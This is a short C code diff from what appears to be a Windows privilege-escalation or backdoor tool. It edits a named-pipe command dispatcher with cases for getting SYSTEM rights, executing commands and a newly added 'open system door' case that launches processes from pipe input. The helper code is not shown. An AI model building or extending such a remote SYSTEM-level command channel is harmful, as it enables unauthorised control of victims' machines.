@@ -69,13 +69,15 @@ DWORD HandleCode(VOID) {
                 break;
             case METHOD_GETSYSTEM:
                 ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
-                Service2System(char2wchar(szBuffer));
+                Service2System();
                 break;
             case METHOD_SYSTEM_EXECUTE:
                 ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
-                SystemCreateProcess(char2wchar(szBuffer));
+                ExecuteCommand(char2wchar(szBuffer));
                 break;
-
+            case METHOD_OPEN_SYSTEM_DOOR:
+                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
+                SystemCreateProcess(char2wchar(szBuffer));
             default:
 
                 break;
